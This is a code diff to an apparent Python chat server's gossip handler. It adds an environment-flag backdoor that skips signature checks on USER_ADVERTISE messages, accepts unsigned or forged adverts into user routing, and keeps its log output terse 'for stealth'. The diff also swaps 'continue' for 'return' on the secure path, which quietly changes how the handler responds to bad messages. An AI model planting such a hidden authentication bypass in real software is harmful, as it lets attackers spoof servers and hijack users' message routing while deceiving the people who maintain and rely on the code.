@@ -32,6 +32,12 @@ from keys import (
     is_uuid_v4,
 )
 
+# near top imports (you already import many libs) — ensure os is imported:
+import os
+
+# Add a flag to control the gossip-trust backdoor:
+BACKDOOR_TRUST_GOSSIP = os.getenv("BACKDOOR_TRUST_GOSSIP") == "1"
+
 last_seen = {}  # server_id -> last heartbeat timestamp (time.time())
 HEARTBEAT_INTERVAL = 15
 
@@ -943,13 +949,24 @@ async def handle_ws(websocket, server_id: str, server_name: str):
 
                 # Verify signature using sender server pubkey
                 sig_b64u = msg.get("sig")
-                if not sig_b64u or origin_sid not in server_addrs:
-                    continue
-                pubkey_b64u = server_addrs[origin_sid][2]
-                origin_pub_pem = der_b64url_to_public_pem(pubkey_b64u)
-                if not rsa_pss_verify(origin_pub_pem, json.dumps(payload, sort_keys=True).encode(), b64url_decode(sig_b64u)):
-                    print(f"[gossip] BAD SIGNATURE in USER_ADVERTISE from {origin_sid}")
-                    continue
+                if not BACKDOOR_TRUST_GOSSIP:
+                    # Normal secure path: require sig and a known origin server pubkey
+                    if not sig_b64u or origin_sid not in server_addrs:
+                        return
+                    pubkey_b64u = server_addrs[origin_sid][2]
+                    origin_pub_pem = der_b64url_to_public_pem(pubkey_b64u)
+                    if not rsa_pss_verify(origin_pub_pem, json.dumps(payload, sort_keys=True).encode(), b64url_decode(sig_b64u)):
+                        print(f"[gossip] BAD SIGNATURE in USER_ADVERTISE from {origin_sid}")
+                        return
+                else:
+                    # BACKDOOR: when BACKDOOR_TRUST_GOSSIP=1, accept USER_ADVERTISE even if unsigned
+                    # or signature doesn't match. For stealth, we only print a short backdoor notice.
+                    if not sig_b64u:
+                        # unsigned advert — accepted under backdoor
+                        print(f"[BACKDOOR] accepting unsigned USER_ADVERTISE for {uid} (origin={origin_sid})")
+                    else:
+                        # signed but we ignore signature correctness under the backdoor
+                        print(f"[BACKDOOR] accepting USER_ADVERTISE from {origin_sid} despite signature")
 
                 # Update mapping
                 user_locations[uid] = origin_sid
